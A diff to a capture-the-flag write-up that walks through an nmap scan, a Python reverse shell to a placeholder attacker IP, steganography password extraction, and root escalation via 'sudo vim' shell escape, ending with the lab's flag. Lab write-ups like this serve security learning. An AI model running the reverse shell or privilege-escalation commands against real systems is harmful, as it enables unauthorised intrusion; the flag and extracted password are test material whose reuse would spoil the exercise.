@@ -97,16 +97,25 @@ Target IP: 35.156.4.248
 First off, let's do an nmap scan to identify which ports are open
 ```
 ┌──(fraize㉿fraize)-[~]
-└─$ nmap 35.156.4.248                                                                           130 ⨯
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 11:51 EAT
+└─$ nmap -sV -sC -oN nmap 35.156.4.248                                                  1 ⚙
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 14:06 EAT
 Nmap scan report for ec2-35-156-4-248.eu-central-1.compute.amazonaws.com (35.156.4.248)
-Host is up (0.0027s latency).
+Host is up (0.17s latency).
 Not shown: 998 filtered ports
-PORT    STATE SERVICE
-80/tcp  open  http
-443/tcp open  https
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:24:fc:36:53:c8:0b:f7:8c:31:7a:28:dd:c9:34:02 (RSA)
+|   256 6c:6e:61:94:2f:fd:f6:d2:dc:25:e3:4f:32:ac:33:15 (ECDSA)
+|_  256 ce:d7:0b:19:cb:32:3b:d4:f1:bf:f7:74:8a:52:d5:bc (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.66 seconds
+                                                             
 ```
 Ports 80/tcp and 443/tcp are open, so i'll check if there is anything interesting in the webpage.
 
@@ -350,3 +359,30 @@ we can as well get a reverse shell and spawning a tty shell using the following 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.x.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
+We opened up a shell in www-data.
+
+Searching up and we get an image in /var/www directory and we can download it into our machine using netcat.
+
+Abit of steganography knowledge and we can extract a password.
+```
+┌──(fraize㉿fraize)-[~]
+└─$ steghide --extract --stegofile TrollFace.jpg
+Enter passphrase:
+wrote extracted data to "password.txt".
+┌──(fraize㉿fraize)-[~]
+└─$ cat password.txt
+Congratulations !!
+Here s your Password : D0n4ldTrump
+┌──(fraize㉿fraize)-[~]
+└─$
+```
+let's go back to our machine and read _/etc/passwd_ and found a user called `alex`, let's switch to the user using the password from the TrollFace image.
+
+Use `sudo -l` to see if there's anything running with root permissions and i found vim working with root permissions so we can use this command to root shell.
+
+```
+sudo vim -c ' : ! /bin/sh ' /usr/bin/vim
+```
+after running this, we get root with the flag
+
+> flag : 2afe5ca13f6aa7c615c05d9cceb6c23e
